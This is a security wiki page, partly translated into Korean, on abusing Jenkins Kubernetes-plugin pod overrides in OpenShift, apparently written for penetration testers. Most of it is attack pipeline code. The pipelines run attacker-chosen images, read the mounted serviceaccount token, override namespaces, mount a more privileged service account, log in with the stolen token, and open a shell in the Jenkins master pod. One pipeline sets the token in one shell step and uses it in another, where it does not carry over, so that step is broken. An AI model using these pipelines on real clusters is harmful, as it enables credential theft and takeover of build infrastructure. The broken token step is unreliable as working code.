# Jenkins in Openshift - build pod overrides

**이 페이지의 원래 저자는** [**Fares**](https://www.linkedin.com/in/fares-siala/)

## Kubernetes plugin for Jenkins
이 플러그인은 openshift/kubernetes 클러스터 내에서 Jenkins 핵심 기능을 주로 담당합니다. 공식 문서 [여기](https://plugins.jenkins.io/kubernetes/)입니다.  
개발자가 Jenkins 빌드 포드의 일부 기본 구성을 재정의할 수 있는 기능과 같은 몇 가지 기능을 제공합니다.

## Core functionnality

이 플러그인은 개발자가 적절한 환경에서 코드를 빌드할 때 유연성을 제공합니다.
```groovy
podTemplate(yaml: '''
apiVersion: v1
kind: Pod
spec:
containers:
- name: maven
image: maven:3.8.1-jdk-8
command:
- sleep
args:
- 99d
''') {
node(POD_LABEL) {
stage('Get a Maven project') {
git 'https://github.com/jenkinsci/kubernetes-plugin.git'
container('maven') {
stage('Build a Maven project') {
sh 'mvn -B -ntp clean install'
}
}
}
}
}
```
## Some abuses leveraging pod yaml override

그러나 이를 악용하여 Kali Linux와 같은 접근 가능한 이미지를 사용하고 해당 이미지에 사전 설치된 도구를 사용하여 임의의 명령을 실행할 수 있습니다.  
아래 예제에서는 실행 중인 pod의 serviceaccount 토큰을 유출할 수 있습니다.
```groovy
podTemplate(yaml: '''
apiVersion: v1
kind: Pod
spec:
containers:
- name: kali
image: myregistry/mykali_image:1.0
command:
- sleep
args:
- 1d
''') {
node(POD_LABEL) {
stage('Evil build') {
container('kali') {
stage('Extract openshift token') {
sh 'cat /run/secrets/kubernetes.io/serviceaccount/token'
}
}
}
}
}
```
다른 구문으로 동일한 목표를 달성합니다.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
```markdown
파드의 네임스페이스를 재정의하는 샘플
```
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
metadata:
namespace: RANDOM-NAMESPACE
spec:
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
또 다른 예는 이름을 기반으로 서비스 계정을 마운트하려고 시도합니다(기본 계정보다 더 많은 권한이 있을 수 있으며, 빌드를 실행 중입니다). 먼저 기존 서비스 계정을 추측하거나 나열해야 할 수도 있습니다.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
serviceAccount: MY_SERVICE_ACCOUNT
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
The same technique applies to try mounting a Secret. The end goal here would be to figure out how to configure your pod build to effectively pivot or gain privileges.

## Going further

Once you get used to play around with it, use your knowledge on Jenkins and Kubernetes/Openshift to find misconfigurations / abuses.

Ask yourself the following questions:

- 어떤 서비스 계정이 빌드 팟을 배포하는 데 사용되고 있습니까?
- 어떤 역할과 권한이 있습니까? 현재 있는 네임스페이스의 비밀을 읽을 수 있습니까?
- 다른 빌드 팟을 더 열거할 수 있습니까?
- 손상된 sa에서 마스터 노드/팟에서 명령을 실행할 수 있습니까?
- 클러스터를 더 열거하여 다른 곳으로 피벗할 수 있습니까?
- 어떤 SCC가 적용되어 있습니까?

어떤 oc/kubectl 명령을 발행해야 하는지 [여기](../openshift-basic-information.md)와 [여기](../../kubernetes-security/kubernetes-enumeration.md)에서 확인할 수 있습니다.

### Possible privesc/pivoting scenarios

Let's assume that during your assessment you found out that all jenkins builds run inside a namespace called _worker-ns_. You figured out that a default serviceaccount called _default-sa_ is mounted on the build pods, however it does not have so many permissions except read access on some resources but you were able to identify an existing service account called _master-sa_.
Let's also assume that you have the oc command installed inside the running build container.

With the below build script you can take control of the _master-sa_ serviceaccount and enumerate further.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
serviceAccount: master-sa
containers:
- name: evil
image: random_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
sh 'token=$(cat /run/secrets/kubernetes.io/serviceaccount/token)'
sh 'oc --token=$token whoami'
}
}
}
}
}
}
```
액세스에 따라 빌드 스크립트에서 공격을 계속해야 하거나 실행 중인 클러스터에서 이 sa로 직접 로그인할 수 있습니다:
```bash
oc login --token=$token --server=https://apiserver.com:port
```
이 sa가 충분한 권한(예: pod/exec)을 가지고 있다면, 같은 네임스페이스 내에서 실행 중인 마스터 노드 pod 내에서 명령을 실행하여 전체 jenkins 인스턴스를 제어할 수 있습니다. 이 pod는 이름을 통해 쉽게 식별할 수 있으며, jenkins 데이터를 저장하는 데 사용되는 PVC(지속 볼륨 클레임)를 마운트해야 한다는 사실로도 확인할 수 있습니다.
```bash
oc rsh pod_name -c container_name
```
마스터 노드 포드가 워커와 동일한 네임스페이스 내에서 실행되지 않는 경우, 마스터 네임스페이스를 대상으로 유사한 공격을 시도할 수 있습니다. 이를 _jenkins-master_라고 가정해 보겠습니다. serviceAccount master-sa는 _jenkins-master_ 네임스페이스에 존재해야 하며 (_worker-ns_ 네임스페이스에는 존재하지 않을 수 있음) 유의하십시오.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
metadata:
namespace: jenkins-master
spec:
serviceAccount: master-sa
containers:
- name: evil-build
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
